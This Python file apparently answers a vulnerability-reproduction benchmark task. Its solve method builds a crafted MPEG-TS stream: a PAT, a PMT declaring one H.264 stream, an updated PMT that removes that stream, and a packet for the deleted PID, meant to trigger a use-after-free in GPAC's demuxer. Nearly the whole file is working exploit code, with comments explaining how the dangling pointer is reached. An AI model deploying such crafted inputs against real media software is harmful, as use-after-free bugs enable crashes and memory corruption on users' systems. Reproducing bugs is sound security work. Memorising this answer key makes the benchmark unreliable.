class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generates a Proof-of-Concept M2TS file to trigger a use-after-free.

        The PoC is an M2TS stream with 6 packets (1128 bytes):
        1. PAT (Program Association Table): Defines a program and points to a PMT (PID 0x100).
        2. PMT (Program Map Table) v0: Defines the program with one elementary stream (PID 0x101).
           This causes the GPAC demuxer to allocate an ES context for this stream.
        3. PMT v1: An update to the same PMT (incremented version number). This version
           defines the program with *zero* streams. This causes the demuxer to call
           gf_m2ts_es_del, freeing the ES context for PID 0x101.
        4. Data Packet: A TS packet with the PID of the now-deleted stream (0x101). When
           the demuxer tries to process this packet, it uses the dangling pointer to
           the freed ES context, triggering the use-after-free vulnerability.
        5. Null Packet: Padding.
        6. Null Packet: Padding.
        """
        
        def crc32_mpeg2(data: bytes) -> int:
            """Calculates the CRC-32/MPEG-2 checksum."""
            crc = 0xFFFFFFFF
            poly = 0x04C11DB7
            for byte in data:
                crc ^= (byte << 24)
                for _ in range(8):
                    if crc & 0x80000000:
                        crc = (crc << 1) ^ poly
                    else:
                        crc <<= 1
            return crc & 0xFFFFFFFF

        def create_ts_packet(pid: int, payload: bytes, pusi: bool = False, continuity_counter: int = 0) -> bytes:
            """Creates a 188-byte MPEG-TS packet."""
            packet = bytearray(188)
            # Header
            packet[0] = 0x47  # Sync byte
            packet[1] = (pid >> 8) & 0x1F
            if pusi:
                packet[1] |= 0x40  # Payload Unit Start Indicator
            packet[2] = pid & 0xFF
            packet[3] = 0x10 | (continuity_counter & 0x0F)  # Payload only, no adaptation field

            # Payload
            offset = 4
            if pusi:
                packet[offset] = 0x00  # Pointer field
                offset += 1
            
            packet[offset:offset+len(payload)] = payload
            
            # Fill remaining with padding
            for i in range(offset + len(payload), 188):
                packet[i] = 0xFF
                
            return bytes(packet)

        poc = b''
        pmt_pid = 0x0100
        es_pid = 0x0101
        
        # --- Packet 1: PAT (Program Association Table) ---
        # Defines Program 1, mapping to PMT at PID 0x0100
        pat_section = bytearray(b'\x00\xb0\x00\x00\x01\xc1\x00\x00\x00\x01')
        pat_section += (0xE000 | pmt_pid).to_bytes(2, 'big')
        section_length = len(pat_section) - 3 + 4  # +4 for CRC
        pat_section[1:3] = (0xB000 | section_length).to_bytes(2, 'big')
        crc = crc32_mpeg2(pat_section)
        pat_section += crc.to_bytes(4, 'big')
        poc += create_ts_packet(pid=0x0000, payload=pat_section, pusi=True, continuity_counter=0)
        
        # --- Packet 2: PMT v0 (defines one stream) ---
        # Defines ES with PID 0x0101 (H.264)
        pmt1_section = bytearray(b'\x02\xb0\x00\x00\x01\xc1\x00\x00')
        pmt1_section += (0xE000 | pmt_pid).to_bytes(2, 'big') # PCR PID
        pmt1_section += b'\xf0\x00' # program_info_length = 0
        pmt1_section += b'\x1b'      # stream_type = H.264
        pmt1_section += (0xE000 | es_pid).to_bytes(2, 'big') # elementary_PID
        pmt1_section += b'\xf0\x00'  # ES_info_length = 0
        section_length = len(pmt1_section) - 3 + 4
        pmt1_section[1:3] = (0xB000 | section_length).to_bytes(2, 'big')
        crc = crc32_mpeg2(pmt1_section)
        pmt1_section += crc.to_bytes(4, 'big')
        poc += create_ts_packet(pid=pmt_pid, payload=pmt1_section, pusi=True, continuity_counter=0)

        # --- Packet 3: PMT v1 (removes the stream) ---
        # Same PMT PID, but version 1 and an empty stream list
        pmt2_section = bytearray(b'\x02\xb0\x00\x00\x01\xc3\x00\x00') # version is now 1 (0xc3)
        pmt2_section += (0xE000 | pmt_pid).to_bytes(2, 'big') # PCR PID
        pmt2_section += b'\xf0\x00' # program_info_length = 0
        # No stream definitions here
        section_length = len(pmt2_section) - 3 + 4
        pmt2_section[1:3] = (0xB000 | section_length).to_bytes(2, 'big')
        crc = crc32_mpeg2(pmt2_section)
        pmt2_section += crc.to_bytes(4, 'big')
        poc += create_ts_packet(pid=pmt_pid, payload=pmt2_section, pusi=True, continuity_counter=1)

        # --- Packet 4: Data packet for the freed stream ---
        # PID 0x0101 is now associated with a freed pointer
        data_payload = b'\x00' * 184 # Payload content does not matter
        poc += create_ts_packet(pid=es_pid, payload=data_payload, pusi=False, continuity_counter=0)

        # --- Packets 5 & 6: Null packets to match ground-truth length ---
        null_packet = b'\x47\x1f\xff\x10' + (b'\xff' * 184)
        poc += null_packet
        poc += null_packet

        return poc
